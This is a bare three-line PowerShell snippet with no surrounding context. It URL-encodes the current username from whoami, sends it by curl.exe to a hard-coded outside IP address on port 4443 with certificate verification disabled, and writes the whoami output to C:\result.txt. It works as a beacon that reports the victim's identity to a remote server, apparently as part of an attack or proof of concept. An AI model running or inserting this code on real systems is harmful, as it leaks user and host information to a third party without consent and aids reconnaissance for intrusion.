$user = [uri]::EscapeDataString((whoami))
curl.exe "https://206.189.113.121:4443/ФЫВ/$user" -k
whoami | Out-File C:\\result.txt
